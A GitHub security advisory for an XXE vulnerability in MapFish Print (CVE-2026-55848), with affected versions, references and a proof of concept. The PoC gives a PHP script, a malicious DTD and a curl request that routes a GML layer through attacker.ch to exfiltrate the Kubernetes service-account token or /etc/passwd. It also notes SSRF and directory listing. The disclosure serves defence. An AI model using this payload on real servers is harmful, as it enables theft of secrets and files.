# [H] MapFish Print has XXE that allows reading arbitrary files of certain types

## Summary
Severity: High
Advisory: GHSA-5v29-34h8-v68r
CVE: CVE-2026-55848
CWE: CWE-611
Ecosystem: Maven
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N (CVSS_V3)
Published: 2026-08-28
Source: https://github.com/advisories/GHSA-5v29-34h8-v68r
Type: github-advisory

## Affected
- Maven: `org.mapfish.print:print-lib` — affected >=3.0.0 <3.28.30
- Maven: `org.mapfish:print.print-servlet` — affected >=3.0.0 <3.28.30
- Maven: `org.mapfish.print:print-lib` — affected >=3.29.0 <3.30.32
- Maven: `org.mapfish.print:print-servlet` — affected >=3.29.0 <3.30.32
- Maven: `org.mapfish.print:print-servlet` — affected >=3.31.0 <3.31.24
- Maven: `org.mapfish.print:print-lib` — affected >=3.32.0 <3.33.16
- Maven: `org.mapfish.print:print-servlet` — affected >=3.32.0 <3.33.16
- Maven: `org.mapfish.print:print-lib` — affected >=3.34.0 <4.0.5
- Maven: `org.mapfish.print:print-servlet` — affected >=3.34.0 <4.0.5

## Details
### Summary
XXE on MapFish Print allows reading arbitrary files of certain types. Eg /etc/passwd or k8 secrets and certs.

https://github.com/mapfish/mapfish-print/commit/13020c0fbc299e5f604e4e66066311c4bf04d507

### Details
To trigger the XXE it is required to host a remote script and dtd file. When using the Print feature its possible to send the attacker server url as url of the gml layer.

The 404 not found path when using the gml Layer will expand the content of the file as path and throw a default 404 with the full content as path.

### PoC
Host this php file somewhere as xxe.php:

```
<?php
$p=$_GET['p'];
$d=dirname($_SERVER['SCRIPT_NAME']);
$u=(empty($_SERVER['HTTPS'])?'http':'https')."://{$_SERVER['HTTP_HOST']}$d/evil.dtd";
header('Content-Type: application/xml');
echo "<?xml version=\"1.0\"?>
<!DOCTYPE x [
 <!ENTITY % payload SYSTEM \"file://$p\">
 <!ENTITY % dtd SYSTEM \"$u\">
 %dtd;
]>
<wfs:FeatureCollection xmlns:wfs=\"http://www.opengis.net/wfs\" xmlns:gml=\"http://www.opengis.net/gml\">
<!-- ".str_repeat('x',200)." -->
<gml:boundedBy><gml:null>unknown</gml:null></gml:boundedBy>
</wfs:FeatureCollection>";
```

and beneath host this "evil.dtd"

`<!ENTITY % exfil "<!ENTITY &#37; error SYSTEM 'file:///xxe-exfil/%payload;'>">
%exfil;
%error;`

Now send a single curl request against your mapfish print server and include your hosted poc url as gml layer url with the path attached you would like to exfil. It will exfil /var/run/secrets/kubernetes.io/serviceaccount/token (most likely your local test setup wont have it, then just replace the path with /etc/passwd or similar plain files)

`curl -sk 'https://mapfish/api/print3/print/mapviewer/buildreport.pdf' \
  -H 'Content-Type: application/json' \
  -d '{"layout":"1. A4 landscape","attributes":{"printDate":"a","url":"","copyright":"","qrimage":"","map":{"projection":"EPSG:2056","rotation":0,"dpi":96,"center":[2600000,1200000],"scale":100000,"layers":[{"type":"gml","url":"https://attacker.ch/xxe.php?p=/var/run/secrets/kubernetes.io/serviceaccount/token"}]}},"outputFormat":"pdf"}'`

Its also noteworthy that when you use just a path with slash in the end /tmp/ for example - it will literally list the files and output this for you.

It is actually also possible to trigger an SSRF and request internal URLs if you'd change the file:// prefix in the dtd to https:// 

### Impact
disclose local files. blind(ish) SSRF (depends on the servers response data)

## References
- https://github.com/mapfish/mapfish-print/security/advisories/GHSA-5v29-34h8-v68r
- https://github.com/mapfish/mapfish-print/pull/4221
- https://github.com/mapfish/mapfish-print/pull/4219
- https://github.com/mapfish/mapfish-print/pull/4217
- https://github.com/mapfish/mapfish-print/pull/4216
- https://github.com/mapfish/mapfish-print/pull/4215
- https://github.com/mapfish/mapfish-print/pull/4212
- https://github.com/mapfish/mapfish-print/commit/d13911ac6e0509444d64e74830f10b14e4dcfdf1
- https://github.com/mapfish/mapfish-print/commit/a55a24873db5f19b37abac7d59144dc86406c236
- https://github.com/mapfish/mapfish-print/commit/56c47d3bf70d8428916dea8ed7005518ad07dc7d
- https://github.com/mapfish/mapfish-print/commit/3525e8150fcb5f40095930ccf7aec0d8ce92bbcb
- https://github.com/mapfish/mapfish-print/commit/23a96e7baa15077bdb0e5fc5a72b18da23af9121
- https://github.com/mapfish/mapfish-print/commit/13beae7a7f970fc3526c1f7ca5db817d8d51fbec
- https://github.com/mapfish/mapfish-print/releases/tag/3.28.30
- https://github.com/mapfish/mapfish-print/releases/tag/3.30.32
- https://github.com/mapfish/mapfish-print/releases/tag/3.31.24
- https://github.com/mapfish/mapfish-print/releases/tag/4.0.5
- https://github.com/mapfish/mapfish-print
